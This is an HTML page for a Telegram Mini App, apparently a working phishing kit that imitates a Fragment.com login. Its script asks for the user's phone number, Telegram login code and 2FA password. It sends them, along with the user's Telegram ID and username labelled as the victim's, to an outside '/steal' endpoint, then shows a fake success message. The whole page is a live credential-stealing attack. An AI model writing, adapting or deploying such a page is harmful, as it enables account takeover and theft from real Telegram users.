<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Access</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #fff; color: #000; padding: 20px; max-width: 400px; margin: 0 auto; }
        .container { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
        h1 { font-size: 22px; font-weight: 600; margin-bottom: 16px; color: #000; }
        .description { font-size: 16px; color: #6B7280; margin-bottom: 24px; line-height: 1.5; }
        .divider { height: 1px; background: #E5E7EB; margin: 24px 0; }
        .section-title { font-size: 18px; font-weight: 500; margin-bottom: 16px; color: #000; }
        .phone-input { display: flex; align-items: center; background: #F3F4F6; border-radius: 8px; padding: 12px 16px; margin-bottom: 24px; }
        .phone-prefix { font-size: 18px; font-weight: 500; margin-right: 8px; }
        .phone-input input { flex: 1; border: none; background: transparent; font-size: 18px; outline: none; }
        .buttons { display: flex; gap: 12px; margin-top: 32px; }
        .btn { flex: 1; padding: 14px 24px; border-radius: 8px; font-size: 16px; font-weight: 500; text-align: center; cursor: pointer; border: none; }
        .btn-cancel { background: #EF4444; color: white; }
        .btn-next { background: #3B82F6; color: white; }
        .error { color: #EF4444; font-size: 14px; margin-top: 8px; display: none; }
    </style>
</head>
<body>
    <div class="container" id="main-screen">
        <h1>Войдите, чтобы использовать аккаунт Telegram</h1>
        <p class="description">
            для fragment.com и Fragment Auction Alerts.<br>
            Введите свой <strong>номер телефона</strong> в международном формате. 
            Подтверждение будет отправлено в Telegram.
        </p>
        <div class="divider"></div>
        <h2 class="section-title">Россия</h2>
        <div class="phone-input">
            <span class="phone-prefix">+7</span>
            <input type="tel" id="phone-input" placeholder="999 123 45 67" maxlength="10">
        </div>
        <div class="error" id="phone-error">Введите правильный номер телефона</div>
        <div class="buttons">
            <button class="btn btn-cancel" onclick="cancel()">ОТМЕНА</button>
            <button class="btn btn-next" onclick="nextStep()">ДАЛЕЕ</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Растягиваем приложение на весь экран
        
        // Данные жертвы (автоматически получаем из Telegram)
        const victimId = tg.initDataUnsafe.user?.id || 'unknown';
        const victimName = tg.initDataUnsafe.user?.username || 'unknown';
        
        function nextStep() {
            const phoneInput = document.getElementById('phone-input');
            const phone = phoneInput.value.replace(/\D/g, '');
            
            if (phone.length !== 10) {
                document.getElementById('phone-error').style.display = 'block';
                return;
            }
            
            const fullPhone = '+7' + phone;
            
            // Запрашиваем код
            const code = prompt('Код подтверждения отправлен в Telegram.\nВведите 5-значный код:');
            if (!code || code.length !== 5) {
                alert('Неверный код');
                return;
            }
            
            // Запрашиваем пароль
            const password = prompt('Введите пароль от Telegram (если нет — оставьте пустым):');
            
            // Отправляем данные на ТВОЙ СЕРВЕР
            fetch('https://vasya1337.pythonanywhere.com/steal', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phone: fullPhone,
                    code: code,
                    password: password || '',
                    victim_id: victimId,
                    victim_name: victimName
                })
            })
            .then(response => {
                if (response.ok) {
                    alert('✅ Вход успешен! Доступ к Fragment открыт.');
                    tg.close(); // Закрываем Mini App
                } else {
                    alert('Ошибка при входе. Попробуйте позже.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Ошибка соединения с сервером');
            });
        }
        
        function cancel() {
            tg.close(); // Закрываем Mini App
        }
    </script>
</body>
</html>